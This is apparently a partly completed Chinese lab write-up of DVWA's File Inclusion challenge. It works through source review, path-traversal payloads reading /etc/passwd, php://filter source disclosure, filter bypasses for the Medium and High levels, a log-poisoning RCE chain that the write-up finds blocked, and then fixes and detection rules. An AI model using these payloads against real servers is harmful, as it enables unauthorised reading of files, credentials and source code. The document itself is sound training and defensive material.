# File Inclusion（文件包含）— DVWA

> 靶场：`vulnerables/web-dvwa`（DVWA v1.10 *Development*）
> 难度：Low ✅ ／ Medium ⬜ ／ High ⬜
> 日期：2026-10-08
> 工具：Burp Suite Community v2026.8
> 覆盖：**LFI（本地文件包含）／ RFI（远程文件包含）／ php://filter**

---

## 📋 使用说明（写完这一篇就可以删掉这一段）

**进度条 = 跑下面这条命令，看它输出几。目标：0。**

```powershell
cd D:\Code\web-security-lab
(Select-String -Path writeups\06-file-inclusion\README.md -Pattern ('待'+'填') -AllMatches).Matches.Count
```

### ★ 这一关有**两个前人没踩过的点**，先读这三句

```text
① 源码要看【两层】：view_source 只给你 source/low.php（取值那两行），
   真正执行 include 的一行在 vulnerabilities/fi/index.php 里。
   —— 这是第二次遇到（第一次：DOM 型 XSS 的 PHP 是空的）

② Medium 和 High 的修复思路，跟你 CSRF §7.1 批过的 stripos 是【同一个病】：
   用字符串处理去做安全判断。

③ 这一关的"危害上限"不是想出来的，是【权限实测出来的】：
   LFI → RCE 这条路，被 PHP 的进程身份挡死了。
```

---

## 0. 一句话总结

<!-- 提示：三句话
       ① 服务器把用户输入当成了什么？（提示：拿它去决定"加载哪份文件"）
       ② 它跟前面几关的根因是同一句话吗？还是换了个说法？
       ③ 这一关最坏能到什么程度？（RCE）—— 但本文实测为什么没走到？
-->

（待填）

---

## 1. 环境

| 项 | 值 |
|---|---|
| 靶场镜像 | `vulnerables/web-dvwa` |
| 入口 | `http://127.0.0.1:8080/vulnerabilities/fi/` |
| 服务端 | Apache 2.4.25 (Debian) ／ PHP 7.0.30 ／ MariaDB |
| 工具 | Burp Suite Community v2026.8 |

### ★ 这一关的"环境"决定了两件事能不能成

| 项 | 值 | 决定什么 |
|---|---|---|
| **`allow_url_include`** | 实测 **Off** | ❌ **RFI 打不了**；✅ 但 **`php://filter` 照样能用** |
| **PHP 进程身份** | 实测 **uid 33 = `www-data`**<br>（读 `/proc/self/status` 得到） | 决定 LFI 能读哪些文件 |
| **日志文件权限** | `-rw-r----- root adm`（640） | ★ **决定 LFI→RCE 走不走得通（本文实测：走不通）** |

---

## 2. 漏洞原理

### 2.1 ★ 这一关的源码要【看两层】

**`view_source.php?id=fi&security=low` 给你的只有这些：**

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```

**→ 只有"取值"，没有 `include`。真正的执行在 `vulnerabilities/fi/index.php` 里。**

**`index.php` 的关键部分**（我用 `php://filter` 从靶场里读出来的，存在 `raw/recovered-index.php.txt`）：

```php
define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated', 'phpids' ) );      // ← ★ 见 §2.3

...
$vulnerabilityFile = '';
switch( $_COOKIE[ 'security' ] ) {                          // ← ★ 难度开关在这
	case 'low':    $vulnerabilityFile = 'low.php';    break;
	case 'medium': $vulnerabilityFile = 'medium.php'; break;
	case 'high':   $vulnerabilityFile = 'high.php';   break;
	default:       $vulnerabilityFile = 'impossible.php'; break;
}
require_once DVWA_WEB_PAGE_TO_ROOT . "vulnerabilities/fi/source/{$vulnerabilityFile}";

// if( count( $_GET ) )
if( isset( $file ) )
	include( $file );                                       // ★★ 原罪行
else {
	header( 'Location:?page=include.php' );
	exit;
}

dvwaHtmlEcho( $page );
```

**★ 两处顺带看出来的东西：**

| 行 | 说明了什么 |
|---|---|
| `switch( $_COOKIE['security'] )` | ★ **"改 cookie 切难度"的实现就在这** —— 而且 `default` 兜底给 `impossible`（好的写法） |
| `include( $file );` **排在** `dvwaHtmlEcho( $page );` **之前** | ★ 解释了 §3 里那个现象：**读到的文件内容出现在页面 HTML 之前** |

### 2.2 ★ 怎么判断"哪一行是原罪行"

`index.php` 里有**两行 `require/include`**，只有一行是漏洞：

| 那一行 | 路径由什么拼成 | 攻击者能控制吗 |
|---|---|---|
| `require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';` | **全是常量** | ❌ 控制不了 |
| **`include( $file );`** | **`$file` ← `$_GET['page']`** | ✅ **完全控制** |

**规则一句话：**

> **判断哪一行是原罪行，就看那个值【是谁给的】——
> 全是常量 / 配置的，就不是它；里面有 `$_GET` / `$_POST` / `$_COOKIE` 的，就是它。**

**拿这个文件里的两行对照：**

| 行 | 值的来源 | 判定 |
|---|---|---|
| `require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';` | **全是常量** | ❌ 不是漏洞 |
| **`include( $file );`** | `$file` ← `$_GET['page']` | ✅ **是漏洞** |

> **这跟 CSRF §2.3 用的是同一条规则** ——
> 那次你也是靠"看这个值是常量还是用户输入的"，把 `document.write(...)` 那一行挑了出来。
> **换了个模块，规则照样能用。**

### 2.3 ★★ 顺手挖到的：那个"全局登录检查"就在这里

```php
dvwaPageStartup( array( 'authenticated', 'phpids' ) );
                       └───────┬───────┘
                    "authenticated" = 必须已登录
```

**这就是你在 CSRF §2.2 写的「它实际上检查了 cookie，但是是谁做的我忘了」的答案。**

```text
你在 CSRF 的实验推出：  "删掉 cookie 就被 302 → 检查发生在【进入关卡之前】"
现在的源码给出：        就是这一行 dvwaPageStartup(['authenticated', ...])
                        实现它的函数在 dvwa/includes/dvwaPage.inc.php 里
```

> ### ★ 这个闭环值得单独记一句
> **"用实验推出结论 → 再用源码验证结论"** ——
> **而且这次源码是【我自己用 `php://filter` 从靶场里挖出来的】，不是别人给的。**
>
> **跨模块的知识在这里接上了。**

### 2.4 四档源码对比 —— 修复思路的演进

| 档位 | 它加了什么 | 属于哪一类 | 有效性 |
|---|---|---|---|
| **Low** | 无 | — | ❌ 裸奔 |
| **Medium** | `str_replace( array( "http://", "https://" ), "", $file );`<br>`str_replace( array( "../", "..\"" ), "", $file );` | **黑名单 + 单次替换** | ⚠️ **可绕（见 §3.4）** |
| **High** | `if( !fnmatch( "file*", $file ) && $file != "include.php" ) { 拒绝 }` | **白名单 + 前缀匹配** | ⚠️ **可绕（见 §3.5）** |
| **Impossible** | 枚举四个合法文件名，其余全拒 | **枚举白名单** | ✅ 绕不过 |

> **★ 注意 Medium 那个 `"..\""`** —— 在 PHP 里这个字符串其实是 `.."`（`\"` 是转义的双引号）。
> **也就是说：这一条过滤项是个"写废了的字符串"，它什么都不会匹配到。**（典型的复制粘贴事故）

**这个演进说明：防御的思路在往"更不可猜"的方向走。**

| 档位 | 思路 | 为什么不行 / 行 |
|---|---|---|
| **Medium** | **黑名单**（列出"坏的"，删掉） | ❌ **"坏东西"是无穷的**，列不全；而且单次替换还不回头检查 |
| **High** | **前缀白名单**（要求开头是 `file`） | ⚠️ **比黑名单好**（只放行一类），但**用字符串前缀去判断"它是哪个文件"本身就不成立** |
| **Impossible** | **枚举白名单**（只认 4 个字符串） | ✅ **不猜任何东西** —— 没有可以被"绕过"的判断逻辑 |

> **★ 跟 CSRF §7.1 那句结论完全一致：「黑名单不可行，白名单可行」。**
>
> **而这一关还多了一层：白名单也有"写得对不对"的问题。**
> `fnmatch("file*")` 是白名单，但它检查的是【字符串开头长什么样】，
> 不是【这个文件真的在哪】—— 所以被 `file:///etc/passwd` 钻了空子。
>
> **真正可靠的白名单，是"枚举"，而不是"用规则去描述"。**

## 3. 复现

### 3.1 第 1 步：先正常用一次（看它"该"长什么样）

点页面上的 `File 1` / `File 2` / `File 3`，看 URL 怎么变。

**正常请求：**（`raw/normal-request.txt` / `raw/normal-response.txt`）

```http
GET /vulnerabilities/fi/?page=file1.php HTTP/1.1
Host: 127.0.0.1:8080
...
Sec-Fetch-Site: same-origin
Referer: http://127.0.0.1:8080/vulnerabilities/fi/?page=include.php
Cookie: PHPSESSID=...; security=low
```

**响应：`200`，`Content-Length: 3852`**（实测核对过 ✅）

**从这一发能看出：`?page=` 的值就是【要包含的文件名】。**

### 3.2 第 2 步：LFI —— 读 `/etc/passwd`

**Payload：**

```text
?page=../../../../../etc/passwd
```

**原始请求 / 响应：**（`raw/lfi-request.txt` / `raw/lfi-response.txt`）

```http
GET /vulnerabilities/fi/?page=../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:8080
...
Sec-Fetch-Site: none
Cookie: PHPSESSID=...; security=low
```

**响应：`200`，`Content-Length: 4219`**（正文 4219 字节，实测一致 ✅）

#### ★ 关于层数：为什么要 5 个 `../`（实测数据）

| 层数 | 结果 |
|---|---|
| 3 层 | ❌ 没读到 |
| 4 层 | ❌ 没读到 |
| **5 层** | ✅ **读到了** |
| **6 层** | ✅ **也读到了** |

**两个"为什么"：**

```text
① 为什么 4 层不行：
   /var/www/html/vulnerabilities/fi/     ← include 的基准目录
     ↑1    ↑2     ↑3        ↑4      ↑5
   往上 5 次才到 /；4 次只到 /var/ → /var/etc/passwd 不存在

② 为什么 6 层也行：
   Linux 上 `..` 到根就"停住"了 ——  /..  ==  /
   → 所以多写几个 ../ 无害，少写就不行
   ★（这跟 Windows 不同 —— payload 要按目标系统调整）
```

#### ★ 一个观察：内容出现在页面 **之前**

```text
位置 0    :  root:x:0:0:root:/root:/bin/bash     ← include 的输出
位置 977  :  <!DOCTYPE html ...                  ← 页面模板才开始
```

**原因在 §2.1 的源码里**：`include( $file );` 排在 `dvwaHtmlEcho( $page );` **之前**。

**因为两者的【渲染路径】不一样：**

| 被包含的东西 | 它干了什么 | 内容出现在哪 |
|---|---|---|
| **`file1.php`** | 它**没有 echo**，而是往 `$page[ 'body' ]` 里**追加** HTML | 由 `dvwaHtmlEcho($page)` **统一渲染** → 出现在**页面内部** ✅ |
| **`/etc/passwd`** | 它是一段**纯文本**，`include` 读进来时**被直接输出** | 发生在 `dvwaHtmlEcho` **之前** → 出现在**页面之前** ✅ |

**`file1.php` 的源码（用 `php://filter` 读出来的）：**

```php
$page[ 'body' ] .= "
<div class=\"body_padded\">
	<h1>Vulnerability: File Inclusion</h1>
	<div class=\"vulnerable_code_area\">
		<h3>File 1</h3>
		<hr />
		Hello <em>" . dvwaCurrentUser() . "</em><br />
		Your IP address is: <em>{$_SERVER[ 'REMOTE_ADDR' ]}</em><br /><br />
		[<em><a href=\"?page=include.php\">back</a></em>]
	</div>
";
```

> ### ★ 结论
> **"内容出现在哪"取决于【被包含的文件是 echo 还是缓冲】——
> 不是漏洞行为不同，是 DVWA 自己的模板机制造成的。**
>
> **换句话说：`include` 一个文件，它的输出会落在页面的哪个位置，
> 取决于那个文件【自己怎么写】—— 不是由 `include` 决定的。**

### 3.3 第 3 步：`php://filter` —— 读 PHP 源码（★ 重要技巧）

**⚠️ 直接 include 一个 `.php` 文件是读不到源码的** —— `include` 会**执行**它。

**要用流包装器把它"编码后再输出"：**

```text
?page=php://filter/convert.base64-encode/resource=index.php
```

**原始请求 / 响应：**（`raw/phpfilter-request.txt` / `raw/phpfilter-response.txt`）

**响应：`200`，`Content-Length: 4584`**（实测一致 ✅），正文开头是一大串 base64。

**解码后就是 §2.1 里那份 `index.php` 源码**（存在 `raw/recovered-index.php.txt`）。

#### ★ 这一招说明了一条修复上的边界

```text
allow_url_include = Off
  → 挡住了 http:// ftp:// 这种【远程】包装器   →  ✅ RFI 打不了
  → ✗ 但挡不住 php://filter                  →  ❌ 本地源码照样能读
      因为 php:// 是 PHP【内部】的流包装器，不算"远程资源"
```

> **★ 所以"关掉 `allow_url_include`"只能挡住 RFI ——
> 它挡不住 LFI，也挡不住用 `php://filter` 读源码。**
> **（这一条要写进 §7）**

### 3.4 Medium：`str_replace` 的绕过

**Medium 的过滤（源码）：**

```php
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

<!-- ★ 判断格（三小问）
     ① 这一行过滤的【类型】是什么？（黑名单 / 白名单 / 枚举）
     ② `str_replace` 把一个子串替换掉之后，会不会【回头再检查】替换后的结果？
        （关键词：单次 / 非递归）
     ③ 那么：什么样的输入，被删掉【一次】"../"之后，正好【剩下】"../"？
        把它重复 5 次，再接上 etc/passwd —— 完整 payload 是什么？
-->

**我输入的 `?page=`：**

```text
....//....//....//....//....//etc/passwd
```

**服务器过滤后得到的值（手工推演，已用 Python 复刻 `str_replace` 验证）：**

```text
../../../../../etc/passwd
```

> ★ **它跟 Low 档的 payload 一模一样。**
> **也就是说：Medium 的过滤，被我"喂"了一个过滤后会变成正常 payload 的输入。**

**逐步推演（每一步都是删掉一个 `../`）：**

| 输入 | 过滤后 | 等价于 |
|---|---|---|
| `....//` | `../` | 1 层 |
| `....//....//` | `../../` | 2 层 |
| … | … | … |
| `....//`×5 | `../../../../../` | ★ **5 层 —— 跟 Low 一样** |

**为什么能成立（两句话）：**

```text
① str_replace 删掉 "../" 之后，【不会回头再检查】替换后的结果 —— 它是单次、非递归的
② 所以 "....//" 被删掉中间那个 "../" 之后，两边【又拼成了】"../"
```

**结果：`200`，`Content-Length: 4228`，页面打印出 `/etc/passwd`** ✅

**原始请求 / 响应：**（`raw/medium-request.txt` / `raw/medium-response.txt`）

> ### ★ 一个"数字对得上"的旁证
> **Medium 的正文 4228 字节，Low 的是 4219 —— 差 9 字节。差在哪？**
>
> ```text
> /etc/passwd 的内容部分：【完全相同】（前 977 字节逐字节一致）
> 差的 9 字节全部来自页面模板：
>     "medium"（6 字符）出现 3 次 = 18
>     "low"   （3 字符）出现 3 次 =  9
>     18 − 9 = ★ 9   ← 正好解释那 9 个字节
> ```
>
> **→ 说明两档读到的文件内容完全一样，只是页面上的难度标签不同。**

### 3.5 High：`fnmatch` 的绕过

**High 的过滤（源码）：**

```php
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
	echo "ERROR: File not found!";
	exit;
}
```

<!-- ★ 判断格
     ① `fnmatch("file*", $file)` 要求 `$file` 满足什么？（只看开头那几个字符）
     ② 有没有一种【URL 协议】的名字正好以 `file` 开头？
        （提示：`file:///etc/passwd` —— 它本身就是一个本地文件包装器）
     ③ 为什么这一招能同时骗过 `fnmatch` 和 `include`？
-->

**我输入的 `?page=`：**

```text
file:///etc/passwd
```

**为什么 `fnmatch( "file*", $file )` 会放它过去：**

```text
fnmatch("file*", "file:///etc/passwd")
         └─┬─┘   └────────┬────────┘
        "file"+后面随便    前 4 个字符正好是 "file"   →   ✅ 通过
```

> ### ★ 一句话
> **白名单检查的是【字符串的长相】，而那个字符串可以是一个【协议名】——
> 而 `file` 协议的名字，恰好也叫 `file`。**
>
> **"长相"和"含义"被拆开了：检查的那 4 个字符，跟这个字符串实际要做的事，没有关系。**

**关于那三个斜杠（不是魔法，是 URL 结构决定的）：**

| 写法 | `host` 部分 | `path` 部分 | 结果 |
|---|---|---|---|
| `file://etc/passwd` | `etc` | `/passwd` | ❌ 去找 `/passwd`（不存在） |
| **`file:///etc/passwd`** | **空** | **`/etc/passwd`** | ✅ **读到了** |

```text
file://  +  /etc/passwd   =   file:///etc/passwd
   └2 个斜杠┘   └路径自带 1 个斜杠┘
```

**结果：`200`，`Content-Length: 4222`，页面打印出 `/etc/passwd`** ✅

**原始请求 / 响应：**（`raw/high-request.txt` / `raw/high-response.txt`）

> ### ★ 三档放在一起看 —— 一个能验算的旁证
>
> | 档位 | 正文长度 | 与 Low 的差 | 归因 |
> |---|---|---|---|
> | Low（`security=low`） | 4219 | — | — |
> | Medium（`security=medium`） | 4228 | **+9** | `medium`(6) 比 `low`(3) 长 3，在页面里出现 **3 次** → 3×3 = 9 |
> | High（`security=high`） | 4222 | **+3** | `high`(4) 比 `low`(3) 长 1，出现 3 次 → 1×3 = 3 |
>
> **而且三档读到的 `/etc/passwd` 部分【逐字节完全相同】。**
>
> **→ 三个 payload 读到的是同一个文件，差异【只来自页面模板里的难度标签】。**
> **这反向证明了三次攻击都真的成功了。**

### 3.6 证据链：这几份报文怎么互相印证

| 证据 | 它证明什么 |
|---|---|
| `raw/normal-*.txt` | **这个功能本来该长什么样**（`?page=file1.php`，同源导航） |
| **`raw/lfi-*.txt`** | ★ **能把服务器上的任意可读文件读出来**（`/etc/passwd` 20 行） |
| **`raw/phpfilter-*.txt`** + `raw/recovered-index.php.txt` | ★ **连 PHP 源码都能读**（虽然 `allow_url_include` 是 Off） |
| `raw/medium-*.txt` / `high-*.txt` | **两档过滤各自被绕过** |

---

## 4. ★ 重点专题：为什么"字符串处理"做不了安全检查

**这一关的两档防御，跟你 CSRF §7.1 批过的那一条，是同一个病。**

| # | 在哪 | 它想干什么 | 它实际做了什么 | 怎么被绕 |
|---|---|---|---|---|
| 1 | **CSRF Medium** | 判断"请求是不是来自我自己站" | `stripos($referer, $server_name)` —— **在字符串里找子串** | `127.0.0.1.evil.example` |
| 2 | **FI Medium** | 删掉路径穿越和远程协议 | `str_replace(...)` —— **单次替换，不回头检查** | `....//` ／ `hthttp://tp://` |
| 3 | **FI High** | 只允许 `file*.php` | `fnmatch("file*", $file)` —— **只看前 4 个字符** | `file:///etc/passwd` |

<!-- ★ 判断格（本文最重要的一句）
     把三行横着看，写出它们的【共同点】：
       "它们都想判断一个【结构化的东西】（URL / 路径 / 域名）属不属于我，
         但用的手段是【____】。"
     再写出正确做法的方向：
       "要做这种判断，必须先【____】，再【____】。"
-->

（待填 ★）

> ### ★ 一句话记住
> **凡是"判断一段结构化内容属不属于我"，都必须【先解析、再比较字段】——
> 用字符串搜索、替换、前缀匹配，一定会被绕过去。**
>
> **这条规则后面还会用**：
> **File Upload**（检查扩展名）、**SSRF / Open Redirect**（检查 URL 域名）——
> **都是同一族。**

---

## 5. ★ 从 LFI 到 RCE —— 以及为什么这次走不通

### 5.1 经典链条（理论上）

```text
① 日志文件里会记录【User-Agent】
② 而 User-Agent 是【请求方可以随便写的】
③ 于是：把 PHP 代码写进 User-Agent → 它会出现在 access.log 里
④ 再用 LFI 去 include 那个日志文件 → ★ PHP 代码被执行 → RCE
```

**而那个日志文件你早就认识：`/var/log/apache2/access.log`**（第一阶段你一直在 `docker cp` 它出来喂给 `loganalyze.py`）。

### 5.2 ★ 但实测走不通 —— 权限边界挡住了

**容器里的权限（实测）：**

```text
-rw-r----- 1 root adm  184486 Oct  8 14:00 access.log
└─┬─┘└┬┘└─┬─┘
  │   │   └── 组是 adm，只有 root 和 adm 组能读（640）
  │   └────── 属主 root
  └────────── www-data 既不是 root，也不在 adm 组
```

**PHP 的进程身份（实测，读 `/proc/self/status` 得到）：**

```text
Uid:	33	33	33	33        ← uid 33 = www-data（/etc/passwd 里有这一行）
Gid:	33	33	33	33
```

**两步一合：**

```text
读写权限 640 root:adm   +   PHP 以 www-data(33) 运行
        ↓
❌ www-data 读不到 access.log
        ↓
★ LFI → RCE 这条路走不通 —— 【不是 payload 写错了，是权限不允许】
```

**实测对照：**

| 目标 | 结果 |
|---|---|
| `/etc/passwd`（644，世界可读） | ✅ 读到了 |
| `/var/log/apache2/access.log`（640 root:adm） | ❌ 读不到 |
| `/var/log/apache2/error.log`（640 root:adm） | ❌ 读不到 |
| `/proc/self/status` | ✅ 读到了（拿到了 PHP 的 uid） |

<!-- ★ 判断格（这一节最值钱的一句）
     同样存在 LFI，一个环境能 RCE、另一个不能。那"能不能利用"取决于什么？
     再想一层：真实渗透报告里，"存在漏洞"和"能利用"应该怎么写？
       （提示：分开写 —— 漏洞存在是事实，"可利用性"要带上【前提条件】）
-->

（待填 ★）

> ### ★ 这就是"危害上限"的正确写法
> - ❌ 业余写法：「存在 LFI，可以 RCE」
> - ✅ 专业写法：「存在 LFI；理论上可经日志注入升级为 RCE，
>   但本环境中 PHP 以 `www-data`(uid 33) 运行、日志权限为 `640 root:adm`，
>   **该路径不可行**。」
>
> **把"需要什么前提"写清楚，是专业和业余的分界线。**

### 5.3 这一关的其它危害（不依赖 RCE）

| 危害 | 说明 |
|---|---|
| **读任意可读文件** | 配置、源码、密钥、`/proc` 下的进程信息 |
| **读源码** | 拿到源码 → 能找到更多漏洞（比如本文就靠它挖到了 §2.3） |
| **配合文件上传** | 先上传一个文件，再 LFI 去包含它 → RCE（下一关就学） |

---

## 6. 根因

<!-- ★ 判断格
     不要写"没过滤 ../"。要写：服务器把用户输入当成了【什么】。
     提示：它是拿用户的输入去【决定加载哪一份代码】——
           所以严格说，这一关的根因【不是"数据变成代码"】，而是"____"。
     （回想 §2.2：那两行里，一行是常量、一行是用户输入 —— 差别在哪）
-->

（待填 ★）

---

## 7. 修复方案

### 7.1 三档防御为什么都不够（对照 §4）

| 做法 | 为什么不够 |
|---|---|
| **黑名单 `str_replace("../")`** | 单次替换、不递归 → `....//` 绕过；而且黑名单永远列不全（`..\`、`%2e%2e`、绝对路径…） |
| **前缀白名单 `fnmatch("file*")`** | 用**字符串前缀**代替**路径判断** → `file:///etc/passwd` 正好以 `file` 开头 |
| **关掉 `allow_url_include`** | 只挡 RFI；**挡不住 LFI，也挡不住 `php://filter`**（§3.3 实测） |

### 7.2 正确做法：**枚举白名单 + 先规范化再比较**

> **DVWA 的 Impossible 档用的就是第一种：**

```php
// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
	echo "ERROR: File not found!";
	exit;
}
```

**为什么它绕不过去：** 因为它**没有"猜"任何东西** —— 它只认四个写死的字符串，其余全拒。

**更通用的工程做法（自己写一句）：**

**正确做法：先【规范化】，再比较。**

```text
① 用 realpath() 把路径规范化成绝对路径（它会解开 ../ 、// 、符号链接）
② 检查规范化后的结果，是不是以【允许目录】开头
③ 不是 → 拒绝
```

**为什么"直接检查字符串前缀"不行、"规范化之后再检查"就行：**

```text
输入：  /var/www/html/../../etc/passwd
        └──────────┬──────────┘
   直接看字符串前缀 → 它以 /var/www/html 开头 → ❌ 误判成"在允许目录内"

realpath() 规范化后：  /etc/passwd
        └────┬────┘
   再检查前缀 → 不以 /var/www/html 开头 → ✅ 拒绝
```

> ### ★ 关键区别
> **字符串比较发生在【语法】层面；`realpath()` 把它拉到【语义】层面。**
>
> **同一段路径可以有无数种写法（`../`、`//`、符号链接、URL 编码……），
> 但规范化之后只有一种 —— 那个时候再比，才有意义。**
>
> **这就是 CSRF §7.1 那句话的同一个版本："先解析、再比较" ——
> 只不过这里解析的是【路径】。**

### 7.3 纵深防御

| 手段 | 作用 |
|---|---|
| `open_basedir` | 用 PHP 配置把文件访问限制在指定目录树内 —— **从根上限制** |
| 关掉 `allow_url_include` | ✅ **挡 RFI**（但挡不住 LFI，见 §3.3） |
| 降权运行 PHP | 让 PHP 以最小权限的账号跑（本文的 `www-data` 就起了一部分作用 —— 它读不到日志） |
| 不给用户输入决定路径的权力 | ★ **最根本的一条**：让 `?page=` 只能取白名单里的键，映射到写死的文件名 |

---

## 8. 日志特征 ★

### 8.1 这一关的 payload 在请求的哪个部位

| 项 | 值 |
|---|---|
| 方法 | **GET** |
| payload 位置 | **URL 查询串**（`?page=...`） |
| 在 `access.log` 里看得见吗 | **✅ 看得见**（在请求行里） |

**★ 这跟前几关比，算是"很好抓"的一类** —— 因为 payload 本身就是"异常字符串"（`../`、`php://filter`、`/etc/passwd`）。

### 8.2 真实的日志行（从容器里筛出来的）

<!-- ★ 待填：跑下面这条命令，把真实行贴过来

     docker exec dvwa sh -c "grep 'vulnerabilities/fi' /var/log/apache2/access.log | tail -12"

     要注意观察：
       ① 请求行里的 `../` 有没有被 Apache【规范化掉】？（这是关键 —— 如果被规范化，日志里就看不到穿越痕迹了）
       ② 各发的状态码和大小是多少
-->

```text
（待填 ★）
```

### 8.3 ★ 给 `loganalyze.py` 加第 8 条规则（路径穿越）

**这一关的 payload 特征很明确，比 CSRF 那一关好抓得多：**

| 特征 | 说明 |
|---|---|
| `../` 或 `%2e%2e` | 路径穿越 |
| `php://` / `file://` / `data://` | 流包装器 |
| `/etc/passwd` / `/etc/shadow` | 经典目标 |
| `....//` | 绕过变体 |

<!-- ★ 判断格
     写这条规则时，要吸取前面两次的教训：
       ① `[6]` 的教训 —— 规则可能【静默地永不命中】，所以写完必须做什么？
       ② CSRF 那条规则的教训 —— 用字符串包含去判断，会有什么问题？
          （提示：`/etc/passwd` 出现在**正常的**URL 里可能吗？比如一个正常的搜索请求？
           那该怎么办？）
-->

（待填 ★）

### 8.4 日志能不能做安全分析 —— 这一关的边界

<!-- ★ 判断格
     三步对比：
       CSRF        → payload 完全正常，只有 Referer 能说话
       本关（FI）   → payload 本身就是异常字符串，很好认
     那 FI 的边界在哪？（提示：如果 URL 里的 `../` 被服务器【规范化】掉，
                        日志里还剩什么？去 §8.2 看看真实行）
-->

（待填 ★）

---

## 9. 遗留问题

- [ ] **RFI 未实测** —— `allow_url_include = Off`（§1），要打开才能打
- [ ] **`php://filter` 的其他用法**（如 `convert.iconv` 绕过、`string.strip_tags`）未测
- [ ] **LFI → RCE 的其它路径未试**：`/proc/self/environ`、session 文件（`/var/lib/php/sessions/sess_*`）
- [ ] `loganalyze.py` 第 8 条规则未实现
- [ ] Medium / High 档的 writeup 小节待补

---

## 附：环境噪声记录

| 现象 | 原因 | 影响 |
|---|---|---|
| （待填） | （待填） | （待填） |
| （待填） | （待填） | （待填） |
| （待填） | （待填） | （待填） |

<!-- 提示：这一关你有三个特别好的素材：
     ① **"重建的报文"比真实报文多了 256 字节** ——
        助手按你的粘贴重建响应，写出来的文件跟真实响应不一致（靠 Content-Length 才发现）。
        换成真实抓取 + 字节级交叉验证才对上。
        ★ 教训：**看起来对的复制品 ≠ 原件**（这是"静默失效"系列里的又一个）
     ② **同一个功能、两发请求的 `Sec-Fetch-Site` 不同** ——
        地址栏直接输 URL → `none`（无 Referer）；在页面上点链接 → `same-origin`（有 Referer）。
        差点以为"抓包漏了 Referer"。
     ③ **`Content-Length` 会随 `Accept-Encoding` 变** ——
        同一个页面：identity → 4219；gzip → 1425。差了 3 倍。
        ★ 教训：比较两个响应时，`Accept-Encoding` 必须固定（跟 XSS 那关比 md5 是同一个要求）。
-->
